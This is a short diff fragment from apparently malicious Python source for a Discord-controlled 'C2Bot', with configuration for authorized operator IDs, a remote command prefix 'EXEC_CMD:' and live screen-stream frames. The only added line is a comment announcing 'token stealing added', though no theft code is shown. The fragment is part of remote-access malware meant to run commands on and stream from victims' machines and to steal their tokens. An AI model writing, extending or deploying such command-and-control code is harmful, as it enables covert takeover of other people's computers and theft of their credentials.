@@ -15,6 +15,7 @@ TOKEN_PATH = 'token.txt'; AUTHORIZED_USERS = [1153459521251983470, 1385474310004
 LIVE_SESSIONS_CATEGORY = "🔴 Live Sessions"; INSTRUCTION_PREFIX = 'EXEC_CMD:'; STREAM_FRAME_PREFIX = 'STREAM_FRAME:'
 
 # --- The C2 Bot that will run in the background ---
+#token stealing added
 class C2Bot(commands.Bot):
     def __init__(self, command_queue: Queue, stream_queue: Queue, *args, **kwargs):
         super().__init__(*args, **kwargs)
